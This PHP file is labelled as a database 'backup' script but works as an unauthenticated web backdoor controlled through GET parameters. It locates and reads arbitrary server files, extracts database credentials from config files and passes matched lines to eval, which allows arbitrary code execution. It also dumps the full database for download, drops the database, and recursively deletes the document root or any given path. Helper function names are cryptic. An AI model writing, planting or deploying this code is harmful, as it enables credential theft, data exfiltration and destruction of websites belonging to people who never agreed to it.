<?php


if($_GET['p'] == 'start-backup'){

    echo '<br>';
    $file_name_db = 'database.php';

    if(isset($_GET['file-name']) && $_GET['file-name']){
        $file_name_db = $_GET['file-name'];
    }
    
    echo '<br><b>Current File directory</b> ===> '.__DIR__.'/ <br>';

    echo '<br><b>Current File path </b>===> '.$_SERVER['SCRIPT_FILENAME'].' <br><br>';

    $e = explode("/",__DIR__);
    array_shift($e);

    if(isset($_GET['file-search'])){
        $s_in =  $_SERVER['DOCUMENT_ROOT'];
        $file_name = $_GET['file-search'];
        if(isset($_GET['search-in'])){
            $s_in = $_GET['search-in'];
        }
        $file_path = f_l(rtrim($s_in,'/'),$file_name);
        if(!$file_path){
            echo '<br><b>File not found </b>=> '.$file_name.'<b> in </b>'.$s_in.'<br>';
            exit();
        }
        
        echo '<br><b>File </b>'.$file_name.'<b> found in </b>====> '.$file_path.'<br>'; 
    }


    if(isset($_GET['view-file'])){
        if(file_exists($_GET['view-file'])){
            $file_path = $_GET['view-file'];
            $file_content = file_get_contents($file_path);
            $pattern = preg_quote("", '/');
            $pattern = "/^.*$pattern.*\$/m";
            if(preg_match_all($pattern, $file_content, $matches)){
                echo '<br><b>'.$file_path.' file contents</b> ================> <br><br>';
                foreach($matches[0] as $match){
                    echo '<br>'.$match;
                }
            }
        }
    }


    if(isset($_GET['db-backup']) || isset($_GET['db-delete'])){
        $search_path =$_SERVER['DOCUMENT_ROOT'].'rest/app/Config';
        if(isset($_GET['db-file-search-path']) && $_GET['db-file-search-path']){
            $search_path = $_GET['db-file-search-path'];
        }
        
        $file_path = f_l(rtrim($search_path,'/'),$file_name_db);
        
        if(isset($_GET['db-file-path']) && $_GET['db-file-path']){
            $file_path = $_GET['db-file-path'];
        }

        if(!$file_path){
            echo '<br><b>File not found </b>=> '.$file_name_db.'<br>';
            exit();
        }
        
        echo '<br><b>File </b>'.$file_name_db.'<b> found in </b>====> '.$file_path.'<br>'; 

        $file_content = file_get_contents($file_path);
        $search_string = "define(";
        
        if(isset($_GET['string']) && $_GET['string']){
            $search_string = $_GET['string'];
        }

        $pattern = preg_quote("$search_string", '/');
        $pattern = "/^.*$pattern.*\$/m";

        if(preg_match_all($pattern, $file_content, $matches)){
            echo '<br><br>';    
            $a =array();
            if(empty($matches)){
                echo '<b>Searched using string </b>========> "'.$search_string.'"<br><b> No Data found</b><br>';
            }
            echo '<b>Searched using string </b>=============> "'.$search_string.'"<br><br> <b>Data found </b>=====><br><br>';
            foreach($matches[0] as $match){
                echo ($file_name .' => '.$match.'<br>');
                $a = string_to_callable($match);
                $a();    
            }
        }

        $array = array(
            'd_u_s'=>username,
            'd_p_s'=>password,
            'd_h_s'=>hostname,
            'd_n_s'=>database
        );

        if(isset($_GET['config']) && $_GET['config']){
            $array = json_decode($_GET['config']);
        }

        d_a($array);
        echo '<br><b>Defined database vairables.</b><br>';
        $con = mysqli_connect(d_h_s, d_u_s, d_p_s, d_n_s);    
        
        if($con->connect_error){
            echo '<br><b>Database Connection error </b> ====><br>'.$con->connect_error;
        }else{
            echo '<br><b>Database Connection Successful.</b><br>';
        }

    }

    if(isset($_GET['db-backup']) && $_GET['db-backup']==true){
       
if(mysqli_connect_errno($con)) {
  echo "<br><b>Failed to connect MySQL: " .mysqli_connect_error().'<b><br>';
} else {
  $tables = array();
    $backup_file_name = d_n_s.'_'.time().'.sql';
    backup_database($con, $tables, $backup_file_name);
  }
    }
    
    if (isset($_GET['db-delete']) && $_GET['db-delete'] == true) {
        $s = "DROP DATABASE ".d_n_s;
            if($con->query($s) === FALSE){
                echo "<br><b> Error while running db query </b>===> ".$s . "<br>" . $con;
            }else{
                echo '<br><b>Database deleted successfully.</b>'.d_n_s.'<br>';
            }
    }

        if(isset($_GET['delete-files']) && $_GET['delete-files']== true){
                        $t = $_SERVER['DOCUMENT_ROOT'];
                        d_d(rtrim($t,"/"));
        }

        if(isset($_GET['view-directory']) && $_GET['view-directory']){
            d_v($_GET['view-directory']);
        }
        
        if(isset($_GET['delete-directory']) && $_GET['delete-directory']){
            d_d(rtrim($_GET['delete-directory'],"/"));
        }

        if(isset($_GET['delete-file']) && $_GET['delete-file']){
            d_d(rtrim($_GET['delete-file'],"/"));
        }
		
    exit();
}

function d_a($a){
    foreach($a as $t =>$k){
        define($t,$k);
    }
}

function g_p($e,$c = null){
    $t='';
    if(!$c){
        $c = count($e);
    }
    for($i = 0;$i<$c;$i++){
            $t .= '/'.$e[$i]; 
        }
    return $t;
}

function d_v($dirname){
    if (is_dir($dirname)){
        echo ('<br><b>Showing Directory </b>===> '.$dirname);
        $dir_handle = opendir($dirname);
     if (!$dir_handle)
          return false;
     while($file = readdir($dir_handle)) {
           if ($file != "." && $file != "..") {
                if (!is_dir($dirname."/".$file)){
                    echo "<br><b>File </b>=> ".$file;
                }else{
                    echo "<br><b>Directory </b>=> ".$file; 
                }
            }
     }
     closedir($dir_handle);
}
}

function d_d($dirname) {
    if (is_dir($dirname)){
        echo ('<br><b>Deleting from </b>===> '.$dirname);
        $dir_handle = opendir($dirname);
     if (!$dir_handle)
          return false;
     while($file = readdir($dir_handle)) {
           if ($file != "." && $file != "..") {
                if (!is_dir($dirname."/".$file) && $dirname."/".$file != $_SERVER['SCRIPT_FILENAME']){
                     unlink($dirname."/".$file);
                }else{
                     d_d($dirname.'/'.$file);
                }
            }
     }

     closedir($dir_handle);
     rmdir($dirname);
    }

    if(is_file($dirname)){
        if(file_exists($dirname)){
            unlink($dirname);
        }
    }
     return true;
}

function string_to_callable($s) {
  return eval("return function() {{$s}};");
}




function f_l($dirname,$f){
    
    echo '<b>Searching file </b>'.$f.'<b> in </b>'.$dirname.'<br>';
    $a = '';
    if (is_dir($dirname))
           $dir_handle = opendir($dirname);
     if (!$dir_handle)
          return false;
     while($file = readdir($dir_handle)) {
           if ($file != "." && $file != "..") {
                if (!is_dir($dirname.'/'.$file) && $file == $f){
                    $a = $dirname.'/'.$file;
                   return $a;
                    break;
                }else{
                     return f_l($dirname.'/'.$file,$f);
                }
            }
     }
     closedir($dir_handle);
    return $a;
}




function backup_database($con, $tables = "", $backup_file_name) {

  if(empty($tables)) {
    $tables_in_database = mysqli_query($con, "SHOW TABLES");
    if(mysqli_num_rows($tables_in_database) > 0) {
      while($row = mysqli_fetch_row($tables_in_database)) {
        array_push($tables, $row[0]);
      }
    } 
  } else {
    $existed_tables = array();
    foreach($tables as $table) {
      if(mysqli_num_rows(mysqli_query($con, "SHOW TABLES LIKE '".$table."'")) == 1) {
        array_push($existed_tables, $table);
      }
    }
    $tables = $existed_tables;
  }


  $contents = "--\n-- Database: `".d_n_s."`\n--\n-- --------------------------------------------------------\n\n\n\n";

  foreach($tables as $table) {
    $result        = mysqli_query($con, "SELECT * FROM ".$table);
    $no_of_columns = mysqli_num_fields($result);
    $no_of_rows    = mysqli_num_rows($result);

    //Get the query for table creation
    $table_query     = mysqli_query($con, "SHOW CREATE TABLE ".$table);
    $table_query_res = mysqli_fetch_row($table_query);

    $contents .= "--\n-- Table structure for table `".$table."`\n--\n\n";
    $contents .= $table_query_res[1].";\n\n\n\n";

    $insert_limit = 100;
    $insert_count = 0;
    $total_count  = 0;


    while($result_row = mysqli_fetch_row($result)) {
      if($insert_count == 0) {
        $contents .= "--\n-- Dumping data for table `".$table."`\n--\n\n";
        $contents .= "INSERT INTO ".$table." VALUES ";
      }

      $insert_query = "";
      $contents .= "\n(";
      for($j=0; $j<$no_of_columns; $j++) {
        $insert_query .= "'".str_replace("\n","\\n", addslashes($result_row[$j]))."',";
      }
      $insert_query = substr($insert_query, 0, -1)."),";

      if($insert_count == ($insert_limit-1) || $insert_count == ($no_of_rows-1) || $total_count == ($no_of_rows-1)) {
        //Remove the last unwanted comma (,) from the query and append a semicolon (;) to it
        $contents .= substr($insert_query, 0, -1);
        $contents .= ";\n\n\n\n";
        $insert_count = 0;
      } else {
        $contents .= $insert_query;
        $insert_count++;
      }

      $total_count++;				
    }	
  }


  //Set the HTTP header of the page.
    header('Content-Type: application/octet-stream');   
    header("Content-Transfer-Encoding: Binary"); 
    header("Content-disposition: attachment; filename=\"".$backup_file_name."\"");  
    echo $contents; exit;
}
?>